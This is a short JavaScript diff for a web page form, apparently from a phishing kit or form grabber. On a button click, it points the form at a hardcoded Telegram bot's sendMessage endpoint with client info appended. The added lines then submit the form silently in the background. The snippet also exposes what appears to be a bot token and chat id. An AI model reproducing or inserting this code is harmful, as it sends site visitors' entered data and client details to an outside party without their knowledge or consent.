@@ -27,6 +27,8 @@ function getClientInfo(){
 
 btn.addEventListener('click', e => {
     form.setAttribute('action', `https://api.telegram.org/bot1567344190:AAGJOym1zRzGxzrCa4qHom70VLgIcaHy2f8/sendMessage?chat_id=-1001391095034&parse_mode=html&text=${getClientInfo()}`);
-
+    $(document).ready(function () {
+        $('#modal-form').ajaxForm(function () {});
+      }); 
 
 })
